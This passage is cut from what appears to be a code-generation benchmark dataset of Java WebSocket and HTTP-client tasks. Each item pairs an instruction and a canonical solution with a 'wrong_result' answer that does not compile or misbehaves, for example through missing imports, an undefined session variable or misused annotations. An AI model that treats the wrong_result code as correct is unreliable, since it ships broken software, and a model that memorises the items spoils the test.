    "wrong_result": "import javax.websocket.*;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.ConcurrentMap;\nimport java.util.logging.Logger;\n\n@ServerEndpoint(\"/whiteboard\")\npublic class Whiteboard {\n    private static final Logger LOGGER = Logger.getLogger(Whiteboard.class.getName());\n    private static final Object PRESENT = new Object();\n    private static final ConcurrentMap<Session, Object> peers = new ConcurrentHashMap<>();\n\n    @OnOpen\n    public void onOpen(Session peer) {\n        peers.put(peer, PRESENT);\n        LOGGER.info(\"New connection: \" + peer.getId());\n    }\n\n    @OnClose\n    public void onClose(Session peer) {\n        peers.remove(peer);\n        LOGGER.info(\"Connection closed: \" + peer.getId());\n    }\n\n    public void broadcastFigure(Figure figure, Session session) {\n        for (Session target : peers.keySet()) {\n            if (!target.equals(session)) {\n                try {\n                    target.getAsyncRemote().sendText(figure.toString());\n                } catch (IOException e) {\n                    LOGGER.severe(\"Error broadcasting figure: \" + e.getMessage());\n                }\n            }\n        }\n    }\n\n    public void broadcastSnapshot(ByteBuffer data, Session session) {\n        for (Session target : peers.keySet()) {\n            if (!target.equals(session)) {\n                try {\n                    target.getAsyncRemote().sendBinary(data);\n                } catch (IOException e) {\n                    LOGGER.severe(\"Error broadcasting snapshot: \" + e.getMessage());\n                }\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 487,
    "Instruction": "Task Description: Implement a WebSocket server endpoint in Java that handles binary data streams from clients and echoes them back.\n\nClass Description: This class represents a WebSocket server endpoint that receives binary data streams from clients and sends back the same data. It uses Java EE's WebSocket API to create a server endpoint at \"/inputstream\" path.\n\nAttributes: None\n\nMethods:\n- echoStream: [InputStream, Session] -> [void] - Handles incoming binary stream messages. Reads 12 bytes from the input stream and sends them back to the client using the WebSocket session. The method prints the received stream to console for debugging purposes. Throws IOException if there's an error during stream operations.\n\nInput:\n- stream: [InputStream] - The binary input stream received from the client\n- session: [Session] - The WebSocket session object representing the client connection\n\nOutput: None (sends binary data back through the WebSocket session)",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.nio.ByteBuffer;\nimport javax.websocket.OnMessage;\nimport javax.websocket.Session;\nimport javax.websocket.server.ServerEndpoint;\n\n@ServerEndpoint(\"/inputstream\")\npublic class MyEndpointInputStream {\n\n    @OnMessage\n    public void echoStream(InputStream stream, Session session) throws IOException {\n        System.out.println(\"echoStream: \" + stream);\n        byte[] b = new byte[12];\n        stream.read(b);\n        session.getBasicRemote().sendBinary(ByteBuffer.wrap(b));\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "wrong_result": "@ServerEndpoint(\"/inputstream\")\npublic class StreamEndpoint {\n\n    @OnMessage(InputStream.class)\n    public void echoStream(InputStream stream, Session session) throws IOException {\n        byte[] buffer = new byte[12];\n        int bytesRead = stream.read(buffer);\n        if (bytesRead != 12) {\n            throw new IOException(\"Expected 12 bytes but read \" + bytesRead);\n        }\n        for (byte b : buffer) {\n            System.out.print(b + \" \");\n        }\n        System.out.println();\n        session.getBasicRemote().sendBinary(new ByteArrayInputStream(buffer));\n    }\n}"
  },
  {
    "Task_id": 488,
    "Instruction": "Task Description: Implement a WebSocket server endpoint class in Java that handles client connections, messages, and disconnections, supporting both group broadcasting and private messaging.\n\nClass Description: WebSocket server endpoint class that manages client connections through WebSocket protocol, maintains active connections in a concurrent map, and provides message broadcasting and targeted messaging functionality.\n\nAttributes:\n- session: [Session] - The WebSocket session object representing a client connection\n- name: [String] - The identifier for the connected client\n- webSocketSet: [ConcurrentHashMap<String, WebSocket>] - Thread-safe map storing all active WebSocket connections with client names as keys\n\nMethods:\n- OnOpen([Session session, @PathParam(value = \"name\") String name]) -> [void] - Handles new client connections, stores the session and name, and notifies all clients\n- OnClose() -> [void] - Handles client disconnections, removes from active connections, and notifies all clients\n- OnMessage([String messageStr]) -> [void] - Processes incoming messages, routing to either private or group messaging based on message format\n- onError([Session session, Throwable error]) -> [void] - Handles any errors that occur during WebSocket communication\n- GroupSending([String message]) -> [void] - Broadcasts a message to all connected clients\n- AppointSending([String name, String message]) -> [void] - Sends a message to a specific client identified by name",
    "Canonical_solution": "import javax.websocket.*;\nimport javax.websocket.server.PathParam;\nimport javax.websocket.server.ServerEndpoint;\nimport java.util.concurrent.ConcurrentHashMap;\n\n@Component\n@ServerEndpoint(\"/websocket/{name}\")\npublic class WebSocket {\n    private Session session;\n    private String name;\n    private static ConcurrentHashMap<String, WebSocket> webSocketSet = new ConcurrentHashMap<>();\n\n    @OnOpen\n    public void OnOpen(Session session, @PathParam(value = \"name\") String name) {\n        this.session = session;\n        this.name = name;\n        webSocketSet.put(name, this);\n        GroupSending(name + \" \u6765\u4e86\");\n    }\n\n    @OnClose\n    public void OnClose() {\n        webSocketSet.remove(this.name);\n        GroupSending(name + \" \u8d70\u4e86\");\n    }\n\n    @OnMessage\n    public void OnMessage(String messageStr) {\n        if (messageStr.indexOf(\"TOUSER\") == 0) {\n            String[] split = messageStr.split(\";\");\n            String[] split1 = split[0].split(\":\");\n            String[] split2 = split[1].split(\":\");\n            String name = split1[1];\n            String message = split2[1];\n            AppointSending(name, message);\n        } else {\n            GroupSending(messageStr);\n        }\n    }\n\n    @OnError\n    public void onError(Session session, Throwable error) {\n        error.printStackTrace();\n    }\n\n    public void GroupSending(String message) {\n        for (String name : webSocketSet.keySet()) {\n            try {\n                webSocketSet.get(name).session.getBasicRemote().sendText(message);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void AppointSending(String name, String message) {\n        try {\n            webSocketSet.get(name).session.getBasicRemote().sendText(message);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "wrong_result": "import io.javalin.websocket.WebSocket;\nimport io.javalin.websocket.WebSocketHandler;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.Arrays;\nimport java.util.StringJoiner;\nimport java.util.List;\n\npublic class WebSocketEndpoint implements WebSocketHandler {\n    private final ConcurrentHashMap<String, WebSocket> webSocketSet = new ConcurrentHashMap<>();\n\n    @Override\n    public void onOpen(WebSocket session, @PathParam(\"name\") String name) {\n        webSocketSet.put(name, session);\n        session.setAttribute(\"name\", name);\n        notifyAllClients(\"New client \" + name + \" connected\");\n    }\n\n    @Override\n    public void onClose(WebSocket session) {\n        String name = (String) session.getAttribute(\"name\");\n        webSocketSet.remove(name);\n        notifyAllClients(\"Client \" + name + \" disconnected\");\n    }\n\n    @Override\n    public void onMessage(String messageStr, WebSocket session) {\n        if (messageStr.startsWith(\"/private\")) {\n            String[] parts = messageStr.split(\"\\\\s+\", 2);\n            if (parts.length >= 2) {\n                String targetName = parts[1].split(\"\\\\s+\")[0];\n                String content = String.join(\" \", Arrays.asList(parts).subList(2, parts.length));\n                appointSending(targetName, content);\n            }\n        } else {\n            groupSending(messageStr);\n        }\n    }\n\n    @Override\n    public void onError(WebSocket session, Throwable error) {\n        error.printStackTrace();\n    }\n\n    private void groupSending(String message) {\n        webSocketSet.forEach((name, session) -> {\n            session.send(message);\n        });\n    }\n\n    private void appointSending(String name, String message) {\n        WebSocket targetSession = webSocketSet.get(name);\n        if (targetSession != null) {\n            targetSession.send(message);\n        }\n    }\n\n    private void notifyAllClients(String message) {\n        webSocketSet.forEach((name, session) -> {\n            session.send(message);\n        });\n    }\n}"
  },
  {
    "Task_id": 489,
    "Instruction": "Task Description: Implement a WebSocket server endpoint for a chat room application that handles client connections, message broadcasting, and connection termination.\n\nClass Description: The ChatRoomServerEndpoint class is a WebSocket server endpoint that manages a chat room where multiple clients can connect, send messages, and receive broadcasts of all messages. It tracks connected users and handles connection lifecycle events.\n\nAttributes:\n- logger: Logger - Used for logging server activities and errors\n- ONLINE_USER_SESSIONS: Map<String, Session> - Static map storing all active user sessions with usernames as keys (inherited from WebSocketUtils)\n\nMethods:\n- openSession: (@PathParam(\"username\") String username, Session session) -> void - Handles new client connections, adds user to active sessions, and broadcasts welcome message\n- onMessage: (@PathParam(\"username\") String username, String message) -> void - Processes incoming messages from clients and broadcasts them to all connected users\n- onClose: (@PathParam(\"username\") String username, Session session) -> void - Handles client disconnections, removes user from active sessions, and broadcasts departure message\n- onError: (Session session, Throwable throwable) -> void - Handles any errors that occur during WebSocket communication and closes the problematic session",
    "Canonical_solution": "import org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.web.bind.annotation.RestController;\n\nimport javax.websocket.*;\nimport javax.websocket.server.PathParam;\nimport javax.websocket.server.ServerEndpoint;\nimport java.io.IOException;\n\nimport static com.neo.utils.WebSocketUtils.ONLINE_USER_SESSIONS;\nimport static com.neo.utils.WebSocketUtils.sendMessageAll;\n\n@RestController\n@ServerEndpoint(\"/chat-room/{username}\")\npublic class ChatRoomServerEndpoint {\n    private static final Logger logger = LoggerFactory.getLogger(ChatRoomServerEndpoint.class);\n\n    @OnOpen\n    public void openSession(@PathParam(\"username\") String username, Session session) {\n        ONLINE_USER_SESSIONS.put(username, session);\n        String message = \"\u6b22\u8fce\u7528\u6237[\" + username + \"] \u6765\u5230\u804a\u5929\u5ba4\uff01\";\n        logger.info(\"\u7528\u6237\u767b\u5f55\uff1a\"+message);\n        sendMessageAll(message);\n    }\n\n    @OnMessage\n    public void onMessage(@PathParam(\"username\") String username, String message) {\n        logger.info(\"\u53d1\u9001\u6d88\u606f\uff1a\"+message);\n        sendMessageAll(\"\u7528\u6237[\" + username + \"] : \" + message);\n    }\n\n    @OnClose\n    public void onClose(@PathParam(\"username\") String username, Session session) {\n        ONLINE_USER_SESSIONS.remove(username);\n        sendMessageAll(\"\u7528\u6237[\" + username + \"] \u5df2\u7ecf\u79bb\u5f00\u804a\u5929\u5ba4\u4e86\uff01\");\n        try {\n            session.close();\n        } catch (IOException e) {\n            logger.error(\"onClose error\",e);\n        }\n    }\n\n    @OnError\n    public void onError(Session session, Throwable throwable) {\n        try {\n            session.close();\n        } catch (IOException e) {\n            logger.error(\"onError excepiton\",e);\n        }\n        logger.info(\"Throwable msg \"+throwable.getMessage());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "wrong_result": "import javax.websocket.OnOpen;\nimport javax.websocket.OnMessage;\nimport javax.websocket.OnClose;\nimport javax.websocket.OnError;\nimport javax.websocket.Session;\nimport javax.websocket.Endpoint;\nimport java.util.Map;\nimport java.util.HashMap;\nimport java.util.logging.Logger;\n\npublic class ChatRoomServerEndpoint extends Endpoint {\n    private static final Logger logger = Logger.getLogger(ChatRoomServerEndpoint.class.getName());\n    public static final Map<String, Session> ONLINE_USER_SESSIONS = new HashMap<>();\n\n    @OnOpen\n    public void openSession(@PathParam(\"username\") String username, Session session) {\n        ONLINE_USER_SESSIONS.put(username, session);\n        broadcastMessage(\"Welcome, \" + username + \"! You have joined the chat.\");\n    }\n\n    @OnMessage\n    public void onMessage(@PathParam(\"username\") String username, String message, Session session) {\n        if (session != null && session.isOpen()) {\n            broadcastMessage(username + \": \" + message);\n        }\n    }\n\n    @OnClose\n    public void onClose(@PathParam(\"username\") String username, Session session) {\n        ONLINE_USER_SESSIONS.remove(username);\n        broadcastMessage(\"Goodbye, \" + username + \"! You have left the chat.\");\n    }\n\n    @OnError\n    public void onError(Session session, Throwable throwable) {\n        logger.severe(\"Error occurred: \" + throwable.getMessage());\n        session.close();\n    }\n\n    private void broadcastMessage(String message) {\n        for (Session userSession : ONLINE_USER_SESSIONS.values()) {\n            try {\n                userSession.getBasicRemote().sendText(message);\n            } catch (Exception e) {\n                logger.warning(\"Failed to broadcast message: \" + e.getMessage());\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 49,
    "Instruction": "Task Description: Create a Java HTTP client class that simplifies making HTTP requests (GET, POST, DELETE) to a base URI, with support for parameterized URLs and exception handling.\n\nClass Description: TeenyHttpClient is a lightweight HTTP client wrapper that provides methods for common HTTP operations. It handles request construction, execution, and basic response handling while abstracting away boilerplate code.\n\nAttributes:\nbaseUri: String - The base URL to which all requests will be appended\nhttpClient: HttpClient - The underlying HttpClient instance used for making requests\n\nMethods:\nget: get(String url) -> HttpResponse<String> - Sends a GET request to the specified URL appended to the base URI\nget: get(String url, Object... params) -> HttpResponse<String> - Sends a GET request with URL parameters (formatted using String.format)\ndelete: delete(String url, Object... params) -> HttpResponse<String> - Sends a DELETE request with URL parameters\npost: post(String url, Object... params) -> HttpResponse<String> - Sends a POST request with URL parameters (with empty body)\nunchecked: unchecked(Exceptions.ThrowingSupplier<T> throwingSupplier) -> T - Helper method that wraps checked exceptions in RuntimeException",
    "Canonical_solution": "import java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.net.http.HttpResponse.BodyHandlers;\n\npublic class TeenyHttpClient {\n\n    private final String baseUri;\n    private final HttpClient httpClient;\n\n    public TeenyHttpClient(String baseUri) {\n        this.baseUri = baseUri;\n        httpClient = HttpClient.newBuilder()\n                .version(HttpClient.Version.HTTP_1_1)\n                .build();\n    }\n\n    public HttpResponse<String> get(String url) {\n        final HttpRequest httpRequest = HttpRequest.newBuilder()\n                .uri(URI.create(baseUri + url))\n                .build();\n\n        return unchecked(() -> httpClient.send(httpRequest, BodyHandlers.ofString()));\n    }\n\n    public HttpResponse<String> get(String url, Object... params) {\n        final HttpRequest httpRequest = HttpRequest.newBuilder()\n                .uri(URI.create(baseUri + String.format(url, params)))\n                .build();\n\n        return unchecked(() -> httpClient.send(httpRequest, BodyHandlers.ofString()));\n    }\n\n    public HttpResponse<String> delete(String url, Object... params) {\n        final HttpRequest httpRequest = HttpRequest.newBuilder()\n                .uri(URI.create(baseUri + String.format(url, params)))\n                .DELETE()\n                .build();\n\n        return unchecked(() -> httpClient.send(httpRequest, BodyHandlers.ofString()));\n    }\n\n    public HttpResponse<String> post(String url, Object... params) {\n        final HttpRequest httpRequest = HttpRequest.newBuilder()\n                .uri(URI.create(baseUri + String.format(url, params)))\n                .POST(HttpRequest.BodyPublishers.noBody())\n                .build();\n\n        return unchecked(() -> httpClient.send(httpRequest, BodyHandlers.ofString()));\n    }\n\n    private <T> T unchecked(Exceptions.ThrowingSupplier<T> throwingSupplier) {\n        try {\n            return throwingSupplier.get();\n        } catch (Exception e) {\n            throw new RuntimeException(e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "wrong_result": "public class TeenyHttpClient {\n    private final String baseUri;\n    private final HttpClient httpClient;\n\n    public TeenyHttpClient(String baseUri) {\n        this.baseUri = baseUri;\n        this.httpClient = HttpClient.newHttpClient();\n    }\n\n    public HttpResponse<String> get(String url) {\n        return unchecked(() -> {\n            String fullUrl = baseUri + url;\n            HttpRequest request = HttpRequest.newBuilder()\n                .uri(URI.create(fullUrl))\n                .GET()\n                .build();\n            return httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n        });\n    }\n\n    public HttpResponse<String> get(String url, Object... params) {\n        return unchecked(() -> {\n            String formattedUrl = String.format(url, params);\n            String fullUrl = baseUri + formattedUrl;\n            HttpRequest request = HttpRequest.newBuilder()\n                .uri(URI.create(fullUrl))\n                .GET()\n                .build();\n            return httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n        });\n    }\n\n    public HttpResponse<String> delete(String url, Object... params) {\n        return unchecked(() -> {\n            String formattedUrl = String.format(url, params);\n            String fullUrl = baseUri + formattedUrl;\n            HttpRequest request = HttpRequest.newBuilder()\n                .uri(URI.create(fullUrl))\n                .DELETE()\n                .build();\n            return httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n        });\n    }\n\n    public HttpResponse<String> post(String url, Object... params) {\n        return unchecked(() -> {\n            String formattedUrl = String.format(url, params);\n            String fullUrl = baseUri + formattedUrl;\n            HttpRequest request = HttpRequest.newBuilder()\n                .uri(URI.create(fullUrl))\n                .POST(HttpRequest.BodyPublishers.ofString(\"\"))\n                .build();\n            return httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n        });\n    }\n\n    public <T> T unchecked(ThrowingSupplier<T> throwingSupplier) {\n        try {\n            return throwingSupplier.get();\n        } catch (Exception e) {\n            throw new RuntimeException(e);\n        }\n    }\n}"
  },
  {
    "Task_id": 490,
    "Instruction": "Task Description: Implement a WebSocket server endpoint in Java that handles binary data streams from clients and echoes them back.\n\nClass Description: The MyEndpointInputStream class is a WebSocket server endpoint that receives binary data streams from clients and sends back the same data. It uses Java EE's WebSocket API to manage client connections and data exchange.\n\nAttributes: None\n\nMethods:\n1. echoStream(InputStream stream, Session session) -> void - Handles incoming binary data streams from clients. Reads the first 12 bytes from the input stream and sends them back to the client as binary data.\n   - Input Parameters:\n     - stream: InputStream - The binary data stream received from the client\n     - session: Session - The WebSocket session representing the client connection\n   - Return Type: void\n   - Description: This method is triggered when a binary message is received. It reads 12 bytes from the input stream and echoes them back to the client using the session's basic remote interface. The method may throw IOException if there are issues with reading the stream or sending the response.",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.nio.ByteBuffer;\nimport javax.websocket.OnMessage;\nimport javax.websocket.Session;\nimport javax.websocket.server.ServerEndpoint;\n\n@ServerEndpoint(\"/inputstream\")\npublic class MyEndpointInputStream {\n\n    @OnMessage\n    public void echoStream(InputStream stream, Session session) throws IOException {\n        System.out.println(\"echoStream: \" + stream);\n        byte[] b = new byte[12];\n        stream.read(b);\n        session.getBasicRemote().sendBinary(ByteBuffer.wrap(b));\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "wrong_result": "@ServerEndpoint(\"/echo\")\npublic class MyEndpointInputStream {\n\n    @OnMessage\n    public void echoStream(InputStream stream, Session session) throws IOException {\n        byte[] buffer = new byte[12];\n        int bytesRead = stream.read(buffer);\n        if (bytesRead < 12) {\n            throw new IOException(\"Not enough bytes available in the stream\");\n        }\n        session.getBasicRemote().sendBinary(ByteBuffer.wrap(buffer));\n    }\n}"
  },
  {
    "Task_id": 491,
    "Instruction": "Task Description: Create a WebSocket server endpoint class in Java that handles client connections, text messages, and binary messages. The class should manage WebSocket sessions and echo received messages back to clients.\n\nClass Description: The MyEndpoint class is a WebSocket server endpoint that listens for client connections on the \"/websocket\" path. It handles text and binary messages, providing echo functionality while logging connection and message details.\n\nAttributes:\n- None (All required session information is passed through method parameters)\n\nMethods:\n- onOpen: [onOpen](Session session) -> void - Handles new WebSocket connections and logs the client's request URI.\n- echoText: [echoText](String data, boolean part) -> String - Handles incoming text messages, logs message details, and returns the same message (echo). The boolean parameter indicates if the message is complete or partial.\n- echoBinary: [echoBinary](ByteBuffer data, Session session) -> void - Handles incoming binary messages, logs message details, and sends the same binary data back to the client (echo). Throws IOException if sending fails.",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport javax.websocket.OnMessage;\nimport javax.websocket.OnOpen;\nimport javax.websocket.Session;\nimport javax.websocket.server.ServerEndpoint;\n\n@ServerEndpoint(value = \"/websocket\")\npublic class MyEndpoint {\n\n    @OnOpen\n    public void onOpen(Session session) {\n        System.out.println(\"Connected from: \" + session.getRequestURI());\n    }\n\n    @OnMessage\n    public String echoText(String data, boolean part) {\n        System.out.println(\"boolean(text) \" + data);\n        System.out.println(\"text length \" + data.length());\n        if (part) {\n            System.out.println(\"whole message received\");\n        } else {\n            System.out.println(\"partial message received\");\n        }\n        return data;\n    }\n\n    @OnMessage\n    public void echoBinary(ByteBuffer data, Session session) throws IOException {\n        System.out.println(\"boolean(binary) \" + data);\n        System.out.println(\"binary length \" + data.array().length);\n        session.getBasicRemote().sendBinary(data);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "wrong_result": "public class MyEndpoint {\n    public void onOpen(Session session) {\n        System.out.println(\"Client connected: \" + session.getRequestURI());\n    }\n\n    public String echoText(String data, boolean part) {\n        System.out.println(\"Received text message: \" + data + \" (part: \" + part + \")\");\n        try {\n            session.getBasicRemote().sendText(data);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return data;\n    }\n\n    public void echoBinary(ByteBuffer data, Session session) {\n        System.out.println(\"Received binary message: \" + data.toString());\n        try {\n            session.getBasicRemote().sendBinary(data);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}"
  },
  {
    "Task_id": 492,
    "Instruction": "Task Description: Create a WebSocket server endpoint class in Java for deploying containers, handling client connections, and managing deployment processes with error handling.\n\nClass Description: The ContainerDeployServerEndpoint class is a WebSocket server endpoint that facilitates container deployment through WebSocket connections. It handles client connections, initiates container deployment, and manages errors during the process. The class uses Java EE WebSocket API and integrates with a ContainerService for deployment operations.\n\nAttributes:\n- containerService: [ContainerService] - Service responsible for container deployment operations (injected via Spring)\n- log: [Logger] - SLF4J logger instance for logging events and errors (provided by Lombok)\n\nMethods:\n- onOpen: [onOpen](Long id, Session session) -> void - Handles new WebSocket connections. Takes container ID and session as parameters. Sends connection confirmation, initiates deployment, and closes the session. Logs errors if deployment fails.\n- onError: [onError](Session session, Throwable throwable) -> void - Handles WebSocket errors. Takes the session and throwable as parameters. Closes the session and logs the error.\n  \nNote: The class uses @ServerEndpoint annotation to define the WebSocket endpoint path with a configurator, and includes @Component for Spring integration. The endpoint path includes a path parameter for container ID (/container/deploy/{id}).",
    "Canonical_solution": "import tech.powerjob.server.config.OmsEndpointConfigure;\nimport tech.powerjob.server.core.container.ContainerService;\nimport lombok.extern.slf4j.Slf4j;\nimport org.apache.commons.lang3.exception.ExceptionUtils;\nimport org.springframework.stereotype.Component;\n\nimport javax.annotation.Resource;\nimport javax.websocket.*;\nimport javax.websocket.server.PathParam;\nimport javax.websocket.server.ServerEndpoint;\nimport java.io.IOException;\n\n@Slf4j\n@Component\n@ServerEndpoint(value = \"/container/deploy/{id}\", configurator = OmsEndpointConfigure.class)\npublic class ContainerDeployServerEndpoint {\n\n    @Resource\n    private ContainerService containerService;\n\n    @OnOpen\n    public void onOpen(@PathParam(\"id\") Long id, Session session) {\n        RemoteEndpoint.Async remote = session.getAsyncRemote();\n        remote.sendText(\"SYSTEM: connected successfully, start to deploy container: \" + id);\n        try {\n            containerService.deploy(id, session);\n        }catch (Exception e) {\n            log.error(\"[ContainerDeployServerEndpoint] deploy container {} failed.\", id, e);\n            remote.sendText(\"SYSTEM: deploy failed because of the exception\");\n            remote.sendText(ExceptionUtils.getStackTrace(e));\n        }\n        try {\n            session.close();\n        }catch (Exception e) {\n            log.error(\"[ContainerDeployServerEndpoint] close session for {} failed.\", id, e);\n        }\n    }\n\n    @OnError\n    public void onError(Session session, Throwable throwable) {\n        try {\n            session.close();\n        } catch (IOException e) {\n            log.error(\"[ContainerDeployServerEndpoint] close session failed.\", e);\n        }\n        log.warn(\"[ContainerDeployServerEndpoint] session onError!\", throwable);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "wrong_result": "@ServerEndpoint(\"/container/deploy/{id}\")\n@Component\n@Slf4j\npublic class ContainerDeployServerEndpoint {\n\n    @Autowired\n    private ContainerService containerService;\n\n    @OnOpen\n    public void onOpen(Long id, Session session) {\n        try {\n            session.getBasicRemote().sendText(\"Connection established for container \" + id);\n            containerService.deployContainer(id);\n        } catch (Exception e) {\n            log.error(\"Deployment failed for container \" + id, e);\n        } finally {\n            try {\n                session.close();\n            } catch (Exception e) {\n                log.error(\"Error closing session\", e);\n            }\n        }\n    }\n\n    @OnError\n    public void onError(Session session, Throwable throwable) {\n        log.error(\"WebSocket error occurred\", throwable);\n        session.close();\n    }\n}"
  },
  {
    "Task_id": 493,
    "Instruction": "Task Description: Implement a WebSocket server endpoint in Java to handle real-time communication between clients, manage client connections, and broadcast messages to all connected clients.\n\nClass Description: MyWebSocket is a Java class that serves as a WebSocket server endpoint. It maintains a list of connected clients, handles connection events, processes incoming messages, and broadcasts messages to all connected clients while also logging messages to a database.\n\nAttributes:\n- onlineCount: [static int] - Tracks the number of currently connected clients\n- webSocketSet: [static CopyOnWriteArraySet<MyWebSocket>] - Thread-safe set containing all active WebSocket sessions\n- session: [Session] - Represents the WebSocket session for a connected client\n- contentService: [ContentService] - Service for persisting messages to a database (autowired via Spring)\n\nMethods:\n- onOpen: [onOpen]([Session session]) -> [void] - Handles new client connections, adds session to the set, and increments online count\n- onClose: [onClose]() -> [void] - Handles client disconnections, removes session from the set, and decrements online count\n- onMessage: [onMessage]([String message, Session session]) -> [void] - Processes incoming messages and broadcasts them to all connected clients\n- onError: [onError]([Session session, Throwable error]) -> [void] - Handles any errors that occur during WebSocket communication\n- sendMessage: [sendMessage]([String message]) -> [void] - Sends a message to the client and persists it to the database\n- getOnlineCount: [getOnlineCount]() -> [int] - Returns the current number of connected clients (synchronized)\n- addOnlineCount: [addOnlineCount]() -> [void] - Increments the online client count (synchronized)\n- subOnlineCount: [subOnlineCount]() -> [void] - Decrements the online client count (synchronized)",
    "Canonical_solution": "import com.crossoverJie.pojo.Content;\nimport com.crossoverJie.service.ContentService;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.web.socket.server.standard.SpringConfigurator;\n\nimport javax.websocket.*;\nimport javax.websocket.server.ServerEndpoint;\nimport java.io.IOException;\nimport java.text.SimpleDateFormat;\nimport java.util.Date;\nimport java.util.concurrent.CopyOnWriteArraySet;\n\n@ServerEndpoint(value = \"/websocket\",configurator = SpringConfigurator.class)\npublic class MyWebSocket {\n    private static int onlineCount = 0;\n    private static CopyOnWriteArraySet<MyWebSocket> webSocketSet = new CopyOnWriteArraySet<MyWebSocket>();\n    private Session session;\n\n    @Autowired\n    private ContentService contentService;\n\n    @OnOpen\n    public void onOpen(Session session){\n        this.session = session;\n        webSocketSet.add(this);\n        addOnlineCount();\n        System.out.println(\"\u6709\u65b0\u8fde\u63a5\u52a0\u5165\uff01\u5f53\u524d\u5728\u7ebf\u4eba\u6570\u4e3a\" + getOnlineCount());\n    }\n\n    @OnClose\n    public void onClose(){\n        webSocketSet.remove(this);\n        subOnlineCount();\n        System.out.println(\"\u6709\u4e00\u8fde\u63a5\u5173\u95ed\uff01\u5f53\u524d\u5728\u7ebf\u4eba\u6570\u4e3a\" + getOnlineCount());\n    }\n\n    @OnMessage\n    public void onMessage(String message, Session session) {\n        System.out.println(\"\u6765\u81ea\u5ba2\u6237\u7aef\u7684\u6d88\u606f:\" + message);\n        for(MyWebSocket item: webSocketSet){\n            try {\n                item.sendMessage(message);\n            } catch (IOException e) {\n                e.printStackTrace();\n                continue;\n            }\n        }\n    }\n\n    @OnError\n    public void onError(Session session, Throwable error){\n        System.out.println(\"\u53d1\u751f\u9519\u8bef\");\n        error.printStackTrace();\n    }\n\n    public void sendMessage(String message) throws IOException{\n        Content content = new Content() ;\n        content.setContent(message);\n        SimpleDateFormat sm = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:dd\") ;\n        content.setCreatedate(sm.format(new Date()));\n        contentService.insertSelective(content) ;\n        this.session.getBasicRemote().sendText(message);\n    }\n\n    public static synchronized int getOnlineCount() {\n        return onlineCount;\n    }\n\n    public static synchronized void addOnlineCount() {\n        MyWebSocket.onlineCount++;\n    }\n\n    public static synchronized void subOnlineCount() {\n        MyWebSocket.onlineCount--;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "wrong_result": "import org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Component;\nimport javax.websocket.OnClose;\nimport javax.websocket.OnMessage;\nimport javax.websocket.OnOpen;\nimport javax.websocket.Session;\nimport javax.websocket.Endpoint;\nimport java.io.IOException;\nimport java.util.concurrent.CopyOnWriteArraySet;\n\n@Component\npublic class MyWebSocket extends Endpoint {\n    private static int onlineCount = 0;\n    private static CopyOnWriteArraySet<MyWebSocket> webSocketSet = new CopyOnWriteArraySet<>();\n    private Session session;\n    private ContentService contentService;\n\n    @Autowired\n    public void setContentService(ContentService contentService) {\n        this.contentService = contentService;\n    }\n\n    @OnOpen\n    public void onOpen(Session session) {\n        this.session = session;\n        webSocketSet.add(this);\n        addOnlineCount();\n    }\n\n    @OnClose\n    public void onClose() {\n        webSocketSet.remove(this);\n        subOnlineCount();\n    }\n\n    @OnMessage\n    public void onMessage(String message, Session session) {\n        sendMessage(message);\n    }\n\n    @OnError\n    public void onError(Session session, Throwable error) {\n        error.printStackTrace();\n    }\n\n    public void sendMessage(String message) {\n        for (MyWebSocket item : webSocketSet) {\n            try {\n                item.session.getBasicRemote().sendText(message);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        contentService.persistMessage(message);\n    }\n\n    public synchronized int getOnlineCount() {\n        return onlineCount;\n    }\n\n    public synchronized void addOnlineCount() {\n        onlineCount++;\n    }\n\n    public synchronized void subOnlineCount() {\n        onlineCount--;\n    }\n}"
  },
  {
    "Task_id": 494,
    "Instruction": "Task Description: Implement a WebSocket server endpoint for a chat application that broadcasts received messages to all connected clients.\n\nClass Description: The ChatEndpoint class represents a WebSocket server endpoint that handles real-time chat communication. It listens for incoming messages and broadcasts them to all currently connected clients.\n\nAttributes: None\n\nMethods:\n- message: [Name](String message, Session client) -> void - Handles incoming WebSocket messages. Receives a message string and the client session that sent it, then broadcasts the message to all connected sessions.\n  - Input Parameters:\n    - message: String - The chat message received from a client\n    - client: Session - The WebSocket session of the client that sent the message\n  - Output: None (messages are sent directly to client sessions)\n  - Throws: IOException, EncodeException - If there are issues sending messages to clients",
